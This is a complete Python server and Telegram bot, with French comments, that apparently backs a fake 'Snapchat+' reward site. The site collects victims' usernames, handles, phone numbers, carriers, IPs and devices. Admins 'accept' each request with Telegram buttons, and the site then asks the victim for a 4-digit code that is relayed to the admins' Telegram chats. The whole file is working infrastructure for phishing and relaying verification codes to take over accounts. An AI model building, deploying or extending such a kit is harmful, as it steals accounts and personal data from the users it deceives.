import json, os, time, html, threading, uuid, hmac, hashlib
from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.parse import urlparse
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError

# ═════════════════════════════════════════════════════════════════════
#  CONFIGURATION (variables d'environnement)
# ═════════════════════════════════════════════════════════════════════

TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
# ID(s) du/des chat admin, séparé(s) par des virgules. Ex: "123456789,987654321"
ADMIN_IDS = [x.strip() for x in os.environ.get("TELEGRAM_ADMIN_CHAT_ID", "").split(",") if x.strip()]
PORT = int(os.environ.get("PORT", 3000))

SITE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_FILE = os.path.join(SITE_DIR, "data.json")

API_BASE = "https://api.telegram.org/bot%s" % TOKEN if TOKEN else ""

# ═════════════════════════════════════════════════════════════════════
#  BASE DE DONNEES (en memoire + data.json)
# ═════════════════════════════════════════════════════════════════════

requests_db = {}      # rid -> {data, state, code_sent, code_sent_at, user_code, user_id, admin_messages, ...}
history_log = []
blocked_phones = set()
blocked_users = set()


def norm_phone(p):
    return "".join(ch for ch in str(p or "") if ch.isdigit())


def format_phone(n):
    s = str(n or "").strip()
    if not s:
        return ""
    out = ""
    count = 0
    for ch in s:
        if ch.isdigit():
            if count and count % 2 == 0:
                out += " "
            count += 1
        out += ch
    return out


def load_data():
    global requests_db, history_log, blocked_phones, blocked_users
    try:
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            d = json.load(f)
        requests_db = {k: v for k, v in d.get("requests", {}).items()}
        history_log = list(d.get("history", []))
        blocked_phones = set(d.get("blocked_phones", []))
        blocked_users = set(d.get("blocked_users", []))
        print("[server] donnees chargees (%d demandes, %d bloques)" % (len(requests_db), len(blocked_phones)))
    except Exception:
        print("[server] aucune donnee existante, demarrage vierge")


def persist():
    try:
        with open(DATA_FILE, "w", encoding="utf-8") as f:
            json.dump({
                "requests": requests_db,
                "history": history_log[-200:],
                "blocked_phones": sorted(blocked_phones),
                "blocked_users": sorted(blocked_users),
            }, f, ensure_ascii=False)
    except Exception as e:
        print("[server] echec sauvegarde: %s" % e)


def add_history(action, rid=None, data=None, extra=None):
    entry = {"action": action, "ts": int(time.time() * 1000)}
    if rid:
        entry["rid"] = rid
    if data is not None:
        entry["data"] = data
    if extra:
        entry.update(extra)
    history_log.append(entry)
    persist()


# ═════════════════════════════════════════════════════════════════════
#  API TELEGRAM (stdlib urllib)
# ═════════════════════════════════════════════════════════════════════

def tg_api(method, params=None):
    """Appel POST vers l'API Telegram. Retourne le JSON decode ou None."""
    if not TOKEN:
        return None
    url = API_BASE + "/" + method
    body = json.dumps(params or {}).encode("utf-8")
    req = Request(url, data=body, headers={"Content-Type": "application/json"}, method="POST")
    try:
        with urlopen(req, timeout=15) as resp:
            raw = resp.read().decode("utf-8")
            return json.loads(raw)
    except HTTPError as e:
        print("[telegram] HTTP %s sur %s: %s" % (e.code, method, e.read().decode("utf-8", "ignore")[:200]))
        return None
    except Exception as e:
        print("[telegram] erreur sur %s: %s" % (method, e))
        return None


def tg_send_message(chat_id, text, reply_markup=None, parse_mode="HTML"):
    params = {"chat_id": str(chat_id), "text": text, "parse_mode": parse_mode,
              "disable_web_page_preview": True}
    if reply_markup is not None:
        params["reply_markup"] = reply_markup
    return tg_api("sendMessage", params)


def tg_edit_message(chat_id, message_id, text=None, reply_markup=None):
    params = {"chat_id": str(chat_id), "message_id": int(message_id)}
    if text is not None:
        params["text"] = text
        params["parse_mode"] = "HTML"
    if reply_markup is not None:
        params["reply_markup"] = reply_markup
    return tg_api("editMessageText", params)


def tg_edit_reply_markup(chat_id, message_id, reply_markup):
    params = {"chat_id": str(chat_id), "message_id": int(message_id),
              "reply_markup": reply_markup}
    return tg_api("editMessageReplyMarkup", params)


def tg_answer_callback(callback_query_id, text=None, show_alert=False):
    params = {"callback_query_id": callback_query_id}
    if text is not None:
        params["text"] = text
        params["show_alert"] = show_alert
    tg_api("answerCallbackQuery", params)


def tg_set_commands():
    cmds = [
        {"command": "start", "description": "Aide / bienvenue"},
        {"command": "id", "description": "Afficher ton ID de chat"},
    ]
    tg_api("setMyCommands", {"commands": cmds})


# ═════════════════════════════════════════════════════════════════════
#  NOTIFICATIONS ADMIN SUR TELEGRAM (boutons inline)
# ═════════════════════════════════════════════════════════════════════

def admin_keyboard(rid):
    """Clavier inline sous le message de demande envoye a l'admin."""
    return {
        "inline_keyboard": [
            [
                {"text": "✅ Valider", "callback_data": "accept:%s" % rid},
                {"text": "❌ Refuser", "callback_data": "refuse:%s" % rid},
            ],
            [
                {"text": "🚫 Bloquer ce numero", "callback_data": "block:%s" % rid},
            ],
        ]
    }


def admin_text(data, rid, state, code=None):
    base = (
        "📲 <b>Nouvelle demande Snapchat+</b>\n"
        "─────────────\n"
        "<b>Pseudo :</b> %s\n"
        "<b>Compte :</b> @%s\n"
        "<b>Telephone :</b> <code>%s</code>\n"
        "<b>Operateur :</b> %s\n"
        "<b>ID :</b> <code>%s</code>\n"
        "<b>Statut :</b> %s"
    ) % (
        html.escape(str(data.get("pseudo") or "-")),
        html.escape(str(data.get("handle") or "-")),
        html.escape(format_phone(data.get("phone")) or "-"),
        html.escape(str(data.get("operator") or "-")),
        rid[:8].upper(),
        {
            "pending": "En attente ⏳",
            "accepted": "Accepté ✅",
            "refused": "Refusé ❌",
            "blocked": "Bloqué 🚫",
            "done": "Traitée",
            "resolved": "Résolue ✅",
        }.get(state, state),
    )
    if code:
        base += "\n<b>Code a 4 chiffres saisi :</b> <code>%s</code>" % html.escape(code)
    return base


def notify_admins(rid, data):
    """Envoie la demande a tous les admins avec boutons. Stocke les message_id pour editer plus tard."""
    rid_entry = requests_db.get(rid)
    if not rid_entry:
        return
    rid_entry["admin_messages"] = []
    text = admin_text(data, rid, rid_entry.get("state", "pending"))
    markup = admin_keyboard(rid)
    for admin_id in ADMIN_IDS:
        resp = tg_send_message(admin_id, text, reply_markup=markup)
        if resp and resp.get("ok"):
            msg = resp.get("result", {})
            rid_entry["admin_messages"].append({
                "chat_id": admin_id,
                "message_id": msg.get("message_id"),
            })
    persist()


def refresh_admin_messages(rid, state=None, remove_buttons=False, code=None):
    """Met a jour les messages admin apres une action."""
    rid_entry = requests_db.get(rid)
    if not rid_entry:
        return
    if state is not None:
        rid_entry["state"] = state
    data = rid_entry.get("data", {})
    text = admin_text(data, rid, rid_entry.get("state", "pending"), code=code)
    for m in list(rid_entry.get("admin_messages", [])):
        if remove_buttons:
            tg_edit_reply_markup(m["chat_id"], m["message_id"], {"inline_keyboard": []})
        else:
            tg_edit_message(m["chat_id"], m["message_id"], text=text,
                            reply_markup=None if rid_entry.get("state") in ("accepted", "refused", "blocked", "done", "resolved") else admin_keyboard(rid))
    persist()


# ═════════════════════════════════════════════════════════════════════
#  ACTIONS ADMIN (depuis les boutons Telegram ou l'API admin)
# ═════════════════════════════════════════════════════════════════════

def do_accept(rid, by="admin"):
    r = requests_db.get(rid)
    if not r:
        return False
    r["state"] = "accepted"
    r["code_sent"] = True
    r["code_sent_at"] = int(time.time() * 1000)
    r["by"] = by
    add_history("accept", rid=rid, data=r.get("data"))
    refresh_admin_messages(rid, state="accepted", remove_buttons=True)
    persist()
    return True


def do_sendcode(rid, by="admin"):
    return do_accept(rid, by=by)


def do_refuse(rid, by="admin"):
    r = requests_db.get(rid)
    if not r:
        return False
    r["state"] = "done"
    r["by"] = by
    add_history("refuse", rid=rid, data=r.get("data"))
    uid = r.get("user_id")
    if uid:
        tg_send_message(uid, "❌ <b>Votre demande a été refusée.</b>")
    refresh_admin_messages(rid, state="refused", remove_buttons=True)
    persist()
    return True


def do_block(rid, by="admin"):
    r = requests_db.get(rid)
    if not r:
        return False
    phone = norm_phone((r.get("data") or {}).get("phone", ""))
    if phone:
        blocked_phones.add(phone)
        blocked_users.add(r.get("user_id"))
    r["state"] = "done"
    r["by"] = by
    add_history("block", rid=rid, data=r.get("data"), extra={"phone": phone})
    uid = r.get("user_id")
    if uid:
        tg_send_message(uid, "🚫 <b>Votre numero a ete bloqué.</b>")
    refresh_admin_messages(rid, state="blocked", remove_buttons=True)
    persist()
    return True


# ═════════════════════════════════════════════════════════════════════
#  CALLBACK QUERY (clic sur un bouton Telegram)
# ═════════════════════════════════════════════════════════════════════

def handle_callback_query(cq):
    uid = cq.get("from", {}).get("id")
    data = cq.get("data", "")
    cq_id = cq.get("id")

    parts = data.split(":", 1)
    if len(parts) != 2:
        tg_answer_callback(cq_id, text="Données invalides.")
        return
    action, rid = parts

    r = requests_db.get(rid)
    if not r:
        tg_answer_callback(cq_id, text="Demande introuvable ou déjà traitée.")
        refresh_admin_messages(rid, remove_buttons=True)
        return

    ok = False
    if action == "accept":
        ok = do_accept(rid, by="admin")
        tg_answer_callback(cq_id, text="✅ Demande acceptée." if ok else "Erreur.")
    elif action == "sendcode":
        ok = do_sendcode(rid, by="admin")
        tg_answer_callback(cq_id, text="📱 Code déclenché." if ok else "Erreur.")
    elif action == "refuse":
        ok = do_refuse(rid, by="admin")
        tg_answer_callback(cq_id, text="❌ Demande refusée." if ok else "Erreur.")
    elif action == "block":
        ok = do_block(rid, by="admin")
        tg_answer_callback(cq_id, text="🚫 Numéro bloqué." if ok else "Erreur.")
    else:
        tg_answer_callback(cq_id, text="Action inconnue.")
        return

    if not ok:
        tg_answer_callback(cq_id, text="Erreur lors du traitement.")


# ═════════════════════════════════════════════════════════════════════
#  POLLING TELEGRAM (thread de fond)
# ═════════════════════════════════════════════════════════════════════

def poll_loop():
    offset = None
    print("[telegram] demarrage du polling...")
    while True:
        try:
            params = {"timeout": 30, "limit": 100}
            if offset is not None:
                params["offset"] = offset
            resp = tg_api("getUpdates", params)
            if resp and resp.get("ok"):
                for upd in resp.get("result", []):
                    offset = upd["update_id"] + 1
                    if "callback_query" in upd:
                        handle_callback_query(upd["callback_query"])
                    elif "message" in upd:
                        msg = upd["message"]
                        txt = (msg.get("text") or "").strip()
                        chat_id = msg.get("chat", {}).get("id")
                        uid = msg.get("from", {}).get("id")
                        if txt.startswith("/"):
                            cmd = txt.split()[0].lower()
                            if cmd == "/start":
                                tg_send_message(chat_id,
                                    "👋 <b>Bienvenue.</b>\n"
                                    "Utilisez le site web pour soumettre une demande.\n"
                                    "Les validations se font depuis ce bot via les boutons.\n\n"
                                    "Utilisez <b>/id</b> pour connaître votre ID de chat (à renseigner dans TELEGRAM_ADMIN_CHAT_ID).")
                            elif cmd == "/id":
                                tg_send_message(chat_id, "🆔 Votre ID de chat est : <code>%s</code>" % uid)
                            else:
                                tg_send_message(chat_id, "Commande inconnue.")
            else:
                time.sleep(2)
        except Exception as e:
            print("[telegram] erreur polling: %s" % e)
            time.sleep(5)


# ═════════════════════════════════════════════════════════════════════
#  SERVEUR HTTP (site web + API)
# ═════════════════════════════════════════════════════════════════════

class Server(SimpleHTTPRequestHandler):
    def __init__(self, *a, **kw):
        super().__init__(*a, directory=SITE_DIR, **kw)

    def log_message(self, fmt, *args):
        if "304" not in str(args):
            super().log_message(fmt, *args)

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET,POST,OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def _json(self, data, code=200):
        body = json.dumps(data).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(body)

    # ════════════════════════════════════════════════════════════════
    #  GET
    # ════════════════════════════════════════════════════════════════

    def do_GET(self):
        p = urlparse(self.path).path

        if p == "/":
            self.path = "/choose.html"
            return super().do_GET()

        if p.startswith("/api/status/"):
            rid = p.split("/")[-1]
            r = requests_db.get(rid)
            if not r:
                return self._json({"ok": False, "status": "expired"})
            if r["state"] == "done":
                return self._json({"ok": True, "status": "resolved"})
            if r.get("code_sent"):
                return self._json({"ok": True, "status": "code_sent", "at": r["code_sent_at"],
                                   "user_code": r.get("user_code"),
                                   "user_code_submitted": bool(r.get("user_code"))})
            return self._json({"ok": True, "status": "pending"})

        if p == "/api/admin/stats":
            total = len(requests_db)
            pending = sum(1 for r in requests_db.values() if r["state"] == "pending")
            accepted = sum(1 for r in requests_db.values() if r["state"] == "accepted")
            refused = sum(1 for r in requests_db.values() if r["state"] in ("refused", "done") and r.get("by") == "refuse")
            return self._json({"ok": True, "total": total, "pending": pending,
                               "accepted": accepted, "refused": refused})

        if p == "/api/admin/list":
            items = []
            for rid, r in requests_db.items():
                if r["state"] in ("pending", "accepted"):
                    items.append({
                        "id": rid,
                        "data": r["data"],
                        "state": r["state"],
                        "code_sent": r.get("code_sent", False),
                        "user_code": r.get("user_code"),
                    })
            return self._json({"ok": True, "items": items})

        if p == "/api/admin/history":
            return self._json({"ok": True, "items": history_log[-50:][::-1]})

        if p == "/api/admin/blocked":
            return self._json({"ok": True, "items": sorted(blocked_phones)})

        super().do_GET()

    # ════════════════════════════════════════════════════════════════
    #  POST
    # ════════════════════════════════════════════════════════════════

    def do_POST(self):
        p = urlparse(self.path).path
        n = int(self.headers.get("Content-Length", 0))
        raw_body = self.rfile.read(n) if n else b""

        try:
            d = json.loads(raw_body) if raw_body else {}
        except Exception:
            d = {}

        # --- Soumission d'une demande depuis le site ---
        if p == "/api/request":
            rid = d.get("rid", "")
            data = {k: d.get(k) for k in ["service", "pseudo", "handle", "phone", "operator",
                                          "opType", "ip", "device", "browser", "os"]}
            phone = norm_phone(data.get("phone"))

            if phone and phone in blocked_phones:
                requests_db[rid] = {
                    "data": data, "state": "done", "by": "block",
                    "code_sent": False, "code_sent_at": None,
                    "user_code": None, "ts": d.get("ts", int(time.time() * 1000)),
                    "admin_messages": [],
                }
                add_history("block", data=d)
                persist()
                return self._json({"ok": True})

            requests_db[rid] = {
                "data": data, "state": "pending",
                "code_sent": False, "code_sent_at": None,
                "user_code": None, "ts": d.get("ts", int(time.time() * 1000)),
                "admin_messages": [],
            }
            print("[server] Nouvelle demande: %s (%s)" % (data.get("pseudo"), phone))
            persist()

            # Notification Telegram a l'admin avec boutons
            notify_admins(rid, data)
            return self._json({"ok": True})

        # --- Soumission du code a 4 chiffres depuis le site ---
        if p == "/api/code":
            rid = d.get("rid", "")
            code = d.get("code", "")
            r = requests_db.get(rid)
            if not r:
                return self._json({"ok": False}, 404)
            r["user_code"] = code
            r["code_submitted_at"] = int(time.time() * 1000)
            r["state"] = "resolved"
            persist()

            # Envoi du code a l'admin sur Telegram
            text = (
                "🔐 <b>Code reçu</b>\n"
                "─────────────\n"
                "<b>ID demande :</b> <code>%s</code>\n"
                "<b>Pseudo :</b> %s\n"
                "<b>Compte :</b> @%s\n"
                "<b>Telephone :</b> <code>%s</code>\n"
                "<b>Code a 4 chiffres :</b> <code>%s</code>"
            ) % (
                rid[:8].upper(),
                html.escape(str(r.get("data", {}).get("pseudo") or "-")),
                html.escape(str(r.get("data", {}).get("handle") or "-")),
                html.escape(format_phone(r.get("data", {}).get("phone")) or "-"),
                html.escape(code),
            )
            for admin_id in ADMIN_IDS:
                tg_send_message(admin_id, text)
            return self._json({"ok": True})

        # --- API admin (panneau web optionnel) ---
        if p.startswith("/api/admin/accept/"):
            rid = p.split("/")[-1]
            r = requests_db.get(rid)
            if not r:
                return self._json({"ok": False, "error": "not_found"})
            r["code_sent"] = True
            r["code_sent_at"] = int(time.time() * 1000)
            r["state"] = "accepted"
            add_history("accept", data=r["data"])
            refresh_admin_messages(rid, state="accepted", remove_buttons=True)
            persist()
            return self._json({"ok": True})

        if p.startswith("/api/admin/refuse/"):
            rid = p.split("/")[-1]
            r = requests_db.get(rid)
            if not r:
                return self._json({"ok": False, "error": "not_found"})
            r["state"] = "done"
            r["by"] = "refuse"
            add_history("refuse", data=r["data"])
            refresh_admin_messages(rid, state="refused", remove_buttons=True)
            persist()
            return self._json({"ok": True})

        if p.startswith("/api/admin/code/"):
            rid = p.split("/")[-1]
            r = requests_db.get(rid)
            if not r:
                return self._json({"ok": False, "error": "not_found"})
            r["code_sent"] = True
            r["code_sent_at"] = int(time.time() * 1000)
            add_history("send", data=r["data"])
            refresh_admin_messages(rid, state="accepted", remove_buttons=True)
            persist()
            return self._json({"ok": True})

        if p == "/api/admin/block":
            phone = norm_phone(d.get("phone", ""))
            if not phone:
                return self._json({"ok": False, "error": "missing_phone"})
            blocked_phones.add(phone)
            add_history("block", data={"phone": phone})
            persist()
            return self._json({"ok": True, "blocked": sorted(blocked_phones)})

        if p == "/api/admin/unblock":
            phone = norm_phone(d.get("phone", ""))
            blocked_phones.discard(phone)
            persist()
            return self._json({"ok": True, "blocked": sorted(blocked_phones)})

        if p in ("/api/visit", "/api/log"):
            return self._json({"ok": True})

        self.send_error(404)


# ═════════════════════════════════════════════════════════════════════
#  MAIN
# ═════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    print("\n  Reward (site web + bot Telegram) - http://0.0.0.0:%d\n" % PORT)
    if not TOKEN:
        print("[ERREUR] TELEGRAM_BOT_TOKEN manquant !")
    if not ADMIN_IDS:
        print("[ERREUR] TELEGRAM_ADMIN_CHAT_ID manquant !")
    load_data()
    threading.Thread(target=poll_loop, daemon=True).start()
    tg_set_commands()
    print("[telegram] polling actif")
    print("[admin IDs] %s" % ADMIN_IDS)
    HTTPServer(("0.0.0.0", PORT), Server).serve_forever()
